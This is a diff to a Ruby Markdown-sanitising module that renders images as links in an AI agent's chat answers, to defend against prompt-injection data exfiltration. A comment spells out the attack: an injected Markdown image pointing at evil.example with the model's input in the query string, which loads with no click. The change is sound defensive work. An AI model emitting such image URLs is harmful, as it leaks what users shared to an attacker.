@@ -1,7 +1,14 @@
 # frozen_string_literal: true
 
 # Markdown to HTML for the pages that render tracked Markdown: /docs
-# (DocsController) and a dream's story on /dreams (DreamsHelper).
+# (DocsController) and a dream's story on /dreams (DreamsHelper), and for an
+# agent's answer in the CTO web chat (cto_chats/_turn).
+#
+# `images: false` (the chat) renders a Markdown image as a LINK, never an <img>:
+# an answer is model-written from untrusted input (a message, an attached image
+# or PDF), and an <img> loads the moment the page draws it, so an injected
+# `![](https://evil.example/?q=<what the model read>)` would send data out with
+# no click. A link only goes anywhere when the reader chooses to follow it.
 #
 # Raw HTML is filtered (`filter_html`), and a link, autolink or image whose scheme is not
 # on SAFE_SCHEMES renders as its literal Markdown text, never an <a href>. So
@@ -25,8 +32,9 @@ module SafeMarkdown
 
   module_function
 
-  def render(markdown)
-    Redcarpet::Markdown.new(Renderer.new(**RENDER_OPTIONS), **MARKDOWN_OPTIONS)
+  def render(markdown, images: true)
+    renderer = images ? Renderer : NoImageRenderer
+    Redcarpet::Markdown.new(renderer.new(**RENDER_OPTIONS), **MARKDOWN_OPTIONS)
                        .render(markdown.to_s).html_safe # rubocop:disable Rails/OutputSafety
   end
 
@@ -60,6 +68,17 @@ module SafeMarkdown
 
       title_attr = title.to_s.empty? ? "" : %( title="#{html_escape(title)}")
       %(<img src="#{html_escape(url)}" alt="#{html_escape(alt_text)}"#{title_attr}>)
+    end
+  end
+
+  # The chat's renderer: an image is a link to it, labelled by its alt text
+  # (or "image"), so nothing loads until the reader clicks.
+  class NoImageRenderer < Renderer
+    def image(url, _title, alt_text)
+      return nil unless SafeMarkdown.safe_url?(url)
+
+      label = alt_text.to_s.strip.empty? ? "image" : alt_text
+      %(<a href="#{html_escape(url)}" rel="nofollow noopener noreferrer">#{html_escape(label)}</a>)
     end
   end
 end
